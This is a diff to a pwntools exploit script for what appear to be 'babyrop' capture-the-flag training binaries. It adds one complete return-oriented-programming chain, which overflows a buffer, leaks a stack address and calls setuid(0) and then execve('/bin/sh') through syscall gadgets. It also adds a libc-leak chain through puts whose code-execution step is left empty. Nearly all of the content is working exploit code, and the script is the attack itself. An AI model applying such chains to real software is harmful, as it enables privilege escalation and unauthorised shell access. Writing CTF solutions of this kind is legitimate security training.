@@ -135,11 +135,80 @@ def baby4_1(p):
 
     p.sendline(data)
 
-p = process('/challenge/babyrop_level4.1')
-#p = gdb.debug('./babyrop_level4.1','''
-#c            
-#''')
+def baby5_0(p):
+    ''''''
+    challenge = 0x40185c
+    pop_rax = 0x40181e
+    pop_rdi = 0x401855
+    pop_rsi = 0x40183d
+    pop_rdx = 0x401845
+    syscall = 0x40182d
+    execve = 0x3b
+    setuid = 0x69
+    call_rax = 0x401014 #call rax; add rsp,8
+
+    p.recvuntil(b'Programming!')
+
+    # call challenge again so we can write more data after leak happens
+    data = b'A'*136 + p64(pop_rax) + p64(challenge) + p64(call_rax) + \
+           b'B'*100 + b'/bin/sh\0'
+    p.sendline(data)
+
+    # get leak
+    p.recvuntil(b'ROP chain at ')
+    leak = int(p.recvline().strip()[:-1], 16)
+    print('leak', hex(leak))
+
+    data = b'A'*136 +\
+           p64(pop_rax) + p64(setuid) + \
+           p64(pop_rdi) + p64(0) + \
+           p64(syscall) + \
+           p64(pop_rdi) + p64(leak+128) + \
+           p64(pop_rsi) + p64(0) +\
+           p64(pop_rdx) + p64(0) +\
+           p64(pop_rax) + p64(execve)+\
+           p64(syscall) + \
+           b'/bin/sh\0'
+
+    p.sendline(data)
+
+def baby5_1(p):
+    ''''''
+    pop_rax = 0x401c5a
+    pop_rdi = 0x401c4a
+    puts_got = 0x404020
+    puts_plt = 0x401094
+    pop_rsi = 0x2601f
+    challenge = 0x00401c89
+
+    p.recvuntil(b'###')
+
+    #leak chain (use puts to leak puts)
+    data = b'A'*88 + \
+           p64(pop_rdi) + p64(puts_got) + \
+           p64(puts_plt) + p64(challenge)
+    p.sendline(data)
+
+    p.recvuntil(b'Leaving!')
+    p.recvline()
+    leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
+    print('leak: ', hex(leak))
+    libc = leak - 0x80e50
+    print('libc: ', hex(libc))
+    bin_sh = libc + 0x1b45bd 
+    print('bin/sh: ', hex(bin_sh))
+
+    #code execution
+    
 
 
-baby4_1(p)
+
+#p = process('/challenge/babyrop_level5.1')
+#p = process('./babyrop_level5.1')
+p = gdb.debug('./babyrop_level5.1','''
+c            
+''')
+
+
+baby5_1(p)
 p.interactive()
